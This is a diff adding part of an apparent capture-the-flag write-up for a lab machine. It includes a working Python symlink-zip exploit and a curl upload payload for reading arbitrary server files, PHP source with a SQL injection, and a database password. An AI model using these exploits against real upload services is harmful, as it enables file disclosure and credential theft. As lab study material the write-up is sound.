+    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$zipFile</span><span class="p">)</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;&#39;</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="c1">// Get the name of the compressed file</span>
+      <span class="nv">$fileName</span> <span class="o">=</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">getNameIndex</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&quot;pdf&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$uploadPath</span> <span class="o">=</span> <span class="nv">$tmpDir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$uploadDir</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;7z e &#39;</span><span class="o">.</span><span class="nv">$zipFile</span><span class="o">.</span> <span class="s1">&#39; -o&#39;</span> <span class="o">.</span><span class="nv">$uploadPath</span><span class="o">.</span> <span class="s1">&#39;&gt;/dev/null&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$uploadPath</span><span class="o">.</span><span class="nv">$fileName</span><span class="p">))</span> <span class="p">{</span>
+          <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$uploadDir</span><span class="p">);</span>
+          <span class="nb">rename</span><span class="p">(</span><span class="nv">$uploadPath</span><span class="o">.</span><span class="nv">$fileName</span><span class="p">,</span> <span class="nv">$uploadDir</span><span class="o">.</span><span class="nv">$fileName</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;&#39;</span><span class="o">.</span><span class="nv">$uploadDir</span><span class="o">.</span><span class="nv">$fileName</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$uploadDir</span><span class="o">.</span><span class="nv">$fileName</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/p&gt;&#39;</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;The unzipped file must have  a .pdf extension.&lt;/p&gt;&quot;</span><span class="p">;</span>
+      <span class="p">}</span>
+     <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="k">echo</span> <span class="s2">&quot;Error uploading file.&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></div>
+</div>
+<p>Looks like the name and filename matter, I believe it needs to be a name=zipFile and filename=something.zip</p>
+<p>And this is pretty much what the payload should look like according to burp</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>--X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: multipart/form-data; boundary=---------------------------2882812691696788429152111510&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-b<span class="w"> </span><span class="s1">&#39;PHPSESSID=hbgid28hhen8m2b0648svpgg0u&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--data-binary<span class="w"> </span><span class="se">\</span>
+<span class="s1">&#39;</span>
+<span class="s1">-----------------------------2882812691696788429152111510</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">Content-Disposition: form-data; name=\&quot;zipFile\&quot;; filename=\&quot;file.zip\&quot;\x0d\x0aContent-Type: application/zip\x0d\x0a\x0d\x0aPK\x03\x04\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x1c\x00file.pdfUT\x09\x00\x03K\xe3&gt;eN\xe3&gt;eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00/var/www/html/shop/cart.phpPK\x01\x02\x1e\x03\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xa1\x00\x00\x00\x00file.pdfUT\x05\x00\x03K\xe3&gt;eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00N\x00\x00\x00]\x00\x00\x00\x00\x00</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">-----------------------------2882812691696788429152111510</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">Content-Disposition: form-data; name=\&quot;submit\&quot;</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">-----------------------------2882812691696788429152111510</span>
+<span class="s1">--</span>
+<span class="s1">\x0d\x0a</span>
+<span class="s1">&#39;</span>
+
+<span class="s1">&#39;http://10.10.11.229/upload.php&#39;</span>
+</pre></div>
+</div>
+<p>After experimenting a little it looks like we can’t really do this with requests, as far as I can tell requests doesn’t provide that level of granularity, and just automatically matches name with the filename.</p>
+<p>So I ended up borrowing a chunk of code form stack overflow to build the payload manually with http.client</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">http.client</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+
+<span class="k">def</span> <span class="nf">do_the_symlink</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="n">file_name</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;rm </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.pdf&quot;</span><span class="p">],</span>
+        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="c1"># print(res.stdout)</span>
+    <span class="c1"># print(res.stderr)</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>    <span class="c1"># noqa F841</span>
+        <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;ln -s </span><span class="si">{</span><span class="n">link_path</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.pdf&quot;</span><span class="p">],</span>
+        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="c1"># print(res.stdout)</span>
+    <span class="c1"># print(res.stderr)</span>
+
+
+<span class="k">def</span> <span class="nf">do_the_zip</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;rm </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.zip&quot;</span><span class="p">],</span>
+        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="c1"># print(res.stdout)</span>
+    <span class="c1"># print(res.stderr)</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>    <span class="c1"># noqa F841</span>
+        <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;zip --symlink -r </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.zip </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.pdf&quot;</span><span class="p">],</span>
+        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="c1"># print(res.stdout)</span>
+    <span class="c1"># print(res.stderr)</span>
+
+
+<span class="k">def</span> <span class="nf">send_the_zip</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
+
+    <span class="c1"># Prepare the file content</span>
+    <span class="n">file_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.zip&quot;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">file_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="c1"># Define the boundary</span>
+    <span class="n">boundary</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="c1"># Create HTTP connection proxied through burp</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s2">&quot;8080&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">set_tunnel</span><span class="p">(</span>
+      <span class="s2">&quot;10.10.11.229&quot;</span>
+    <span class="p">)</span>
+
+    <span class="c1"># Create multipart/form-data payload</span>
+    <span class="n">payload</span> <span class="o">=</span> \
+        <span class="sa">f</span><span class="s2">&quot;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">zipFile</span><span class="se">\&quot;</span><span class="s2">; &quot;</span> \
+        <span class="sa">f</span><span class="s2">&quot;filename=</span><span class="se">\&quot;</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.zip</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;Content-Type: application/zip</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">file_content</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="sa">f</span><span class="s2">&quot;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span> \
+        <span class="sa">f</span><span class="s2">&quot;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">--</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+    <span class="c1"># Send the request</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/upload.php&quot;</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+    <span class="c1"># Get the response</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="c1"># Close the connection</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="c1"># Print response</span>
+    <span class="c1"># print(response.status, response.reason)</span>
+    <span class="c1"># print(data.decode(&quot;utf-8&quot;))</span>
+
+    <span class="k">return</span> <span class="n">data</span>
+
+
+<span class="k">def</span> <span class="nf">get_the_link</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">),</span> <span class="n">features</span><span class="o">=</span><span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;section&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="s2">&quot;work&quot;</span><span class="p">})</span>
+    <span class="n">link</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">div</span><span class="o">.</span><span class="n">a</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;http://10.10.11.229/</span><span class="si">{</span><span class="n">link</span><span class="si">}</span><span class="s2">&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">get_the_file</span><span class="p">(</span><span class="n">link</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+    <span class="n">data</span><span class="o">.</span><span class="n">status_code</span>
+    <span class="n">file</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">text</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Path of the file to extract&quot;</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">link_path</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">p</span>
+    <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&quot;file&quot;</span>
+
+    <span class="n">do_the_symlink</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+    <span class="n">do_the_zip</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">send_the_zip</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
+    <span class="n">link</span> <span class="o">=</span> <span class="n">get_the_link</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="n">get_the_file</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>zipper.py<span class="w"> </span>-p<span class="w"> </span>/var/www/html/shop/cart.php<span class="w"> </span>&gt;<span class="w"> </span>../loot/cart.php
+</pre></div>
+</div>
+</section>
+<section id="sql-injection">
+<h2>SQL injection<a class="headerlink" href="#sql-injection" title="Permalink to this heading">#</a></h2>
+<p>Looking at cart.php, it’s kinda funny to read, the dev is basically like: “Yea… I don’t really like my boss, sooo I like to spice things up a little”.</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// If the user clicked the add to cart button on the product page we can check for the form data</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;quantity&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="c1">// Set the post variables so we easily identify them, also make sure they are integer</span>
+    <span class="nv">$product_id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">];</span>
+    <span class="nv">$quantity</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;quantity&#39;</span><span class="p">];</span>
+    <span class="c1">// Filtering user input for letters or special characters</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]</span><span class="se">\\</span><span class="s2">|;:&#39;</span><span class="se">\&quot;</span><span class="s2">,.&lt;&gt;\/?]|[^0-9]$/&quot;</span><span class="p">,</span> <span class="nv">$product_id</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}[\]</span><span class="se">\\</span><span class="s2">|;:&#39;</span><span class="se">\&quot;</span><span class="s2">,.&lt;&gt;\/?]/i&quot;</span><span class="p">,</span> <span class="nv">$quantity</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// Construct the SQL statement with a vulnerable parameter</span>
+        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM products WHERE id = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
+        <span class="c1">// Execute the SQL statement without any sanitization or parameter binding</span>
+        <span class="nv">$product</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
+        <span class="c1">// Check if the product exists (array is not empty)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$product</span> <span class="o">&amp;&amp;</span> <span class="nv">$quantity</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Product exists in database, now we can create/update the session variable for the cart</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cart&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cart&#39;</span><span class="p">]))</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$product_id</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cart&#39;</span><span class="p">]))</span> <span class="p">{</span>
+                    <span class="c1">// Product exists in cart so just update the quanity                                                                                                                                              $_SESSION[&#39;cart&#39;][$product_id] += $quantity;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="c1">// Product is not in cart so add it</span>
+                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cart&#39;</span><span class="p">][</span><span class="nv">$product_id</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$quantity</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="c1">// There are no products in cart, this will add the first product to cart</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cart&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$product_id</span> <span class="o">=&gt;</span> <span class="nv">$quantity</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="c1">// Prevent form resubmission...</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;location: index.php?page=cart&#39;</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>functions.php</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">pdo_connect_mysql</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Update the details below with your MySQL details</span>
+    <span class="nv">$DATABASE_HOST</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+    <span class="nv">$DATABASE_USER</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+    <span class="nv">$DATABASE_PASS</span> <span class="o">=</span> <span class="s1">&#39;M**************&#39;</span><span class="p">;</span>
+    <span class="nv">$DATABASE_NAME</span> <span class="o">=</span> <span class="s1">&#39;zipping&#39;</span><span class="p">;</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=&#39;</span> <span class="o">.</span> <span class="nv">$DATABASE_HOST</span> <span class="o">.</span> <span class="s1">&#39;;dbname=&#39;</span> <span class="o">.</span> <span class="nv">$DATABASE_NAME</span> <span class="o">.</span> <span class="s1">&#39;;charset=utf8&#39;</span><span class="p">,</span> <span class="nv">$DATABASE_USER</span><span class="p">,</span> <span class="nv">$DATABASE_PASS</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$exception</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// If there is an error with the connection, stop the script and display the error.</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Failed to connect to database!&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>Building a test setup for the mysql db</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--name<span class="w"> </span>mysql<span class="w"> </span>-e<span class="w"> </span><span class="nv">MYSQL_ROOT_PASSWORD</span><span class="o">=</span><span class="s1">&#39;M**************&#39;</span><span class="w"> </span>-d<span class="w"> </span>-p<span class="w"> </span><span class="m">127</span>.0.0.1:3306:3306<span class="w"> </span>mysql
+21d6b47dc4080acbedc0495e3a9426b079eafeb2bd7c3bccb32c98918d432981
+</pre></div>
+</div>
+<p>I’ll just change localhost to 127.0.0.1 explicitely for the local version</p>
+<p>Creating the zipping database</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--password<span class="o">=</span><span class="s1">&#39;mySQL_p@ssw0rd!:)&#39;</span>
+mysql:<span class="w"> </span>Deprecated<span class="w"> </span>program<span class="w"> </span>name.<span class="w"> </span>It<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>removed<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>future<span class="w"> </span>release,<span class="w"> </span>use<span class="w"> </span><span class="s1">&#39;/usr/bin/mariadb&#39;</span><span class="w"> </span>instead
+Welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>MariaDB<span class="w"> </span>monitor.<span class="w">  </span>Commands<span class="w"> </span>end<span class="w"> </span>with<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span><span class="se">\g</span>.
+Your<span class="w"> </span>MySQL<span class="w"> </span>connection<span class="w"> </span>id<span class="w"> </span>is<span class="w"> </span><span class="m">9</span>
+Server<span class="w"> </span>version:<span class="w"> </span><span class="m">8</span>.2.0<span class="w"> </span>MySQL<span class="w"> </span>Community<span class="w"> </span>Server<span class="w"> </span>-<span class="w"> </span>GPL
+
+Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2000</span>,<span class="w"> </span><span class="m">2018</span>,<span class="w"> </span>Oracle,<span class="w"> </span>MariaDB<span class="w"> </span>Corporation<span class="w"> </span>Ab<span class="w"> </span>and<span class="w"> </span>others.
+
+Type<span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>help.<span class="w"> </span>Type<span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span>to<span class="w"> </span>clear<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>input<span class="w"> </span>statement.
+
+MySQL<span class="w"> </span><span class="o">[(</span>none<span class="o">)]</span>&gt;<span class="w"> </span>create<span class="w"> </span>database<span class="w"> </span>zipping<span class="p">;</span>
+Query<span class="w"> </span>OK,<span class="w"> </span><span class="m">1</span><span class="w"> </span>row<span class="w"> </span>affected<span class="w"> </span><span class="o">(</span><span class="m">0</span>.019<span class="w"> </span>sec<span class="o">)</span>
+
+MySQL<span class="w"> </span><span class="o">[(</span>none<span class="o">)]</span>&gt;<span class="w"> </span>Bye
+</pre></div>
+</div>
+<p>Connecting to zipping and creating the products table based on the error we get when hitting the website</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--password<span class="o">=</span><span class="s1">&#39;M**************&#39;</span><span class="w"> </span>-D<span class="w"> </span>zipping
+mysql:<span class="w"> </span>Deprecated<span class="w"> </span>program<span class="w"> </span>name.<span class="w"> </span>It<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>removed<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>future<span class="w"> </span>release,<span class="w"> </span>use<span class="w"> </span><span class="s1">&#39;/usr/bin/mariadb&#39;</span><span class="w"> </span>instead
+Welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>MariaDB<span class="w"> </span>monitor.<span class="w">  </span>Commands<span class="w"> </span>end<span class="w"> </span>with<span class="w"> </span><span class="p">;</span><span class="w"> </span>or<span class="w"> </span><span class="se">\g</span>.
+Your<span class="w"> </span>MySQL<span class="w"> </span>connection<span class="w"> </span>id<span class="w"> </span>is<span class="w"> </span><span class="m">9</span>
+Server<span class="w"> </span>version:<span class="w"> </span><span class="m">8</span>.2.0<span class="w"> </span>MySQL<span class="w"> </span>Community<span class="w"> </span>Server<span class="w"> </span>-<span class="w"> </span>GPL
+
+Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2000</span>,<span class="w"> </span><span class="m">2018</span>,<span class="w"> </span>Oracle,<span class="w"> </span>MariaDB<span class="w"> </span>Corporation<span class="w"> </span>Ab<span class="w"> </span>and<span class="w"> </span>others.
+
